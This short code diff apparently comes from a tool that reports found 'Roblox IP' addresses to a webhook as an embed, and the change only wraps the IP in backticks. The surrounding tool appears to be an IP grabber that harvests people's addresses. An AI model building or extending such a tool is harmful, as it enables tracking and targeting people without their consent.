@@ -144,7 +144,7 @@ BLOCK_LIST = [] # ["159.196.114.133"]
 def send_embed(webhook_url, ip):
     embed = {
         "title": "Roblox IP",
-        "description": f"IP Found: {ip}",
+        "description": f"IP Found: `{ip}`",
         "color": 0x5865F2
     }
     data = {"embeds": [embed]}
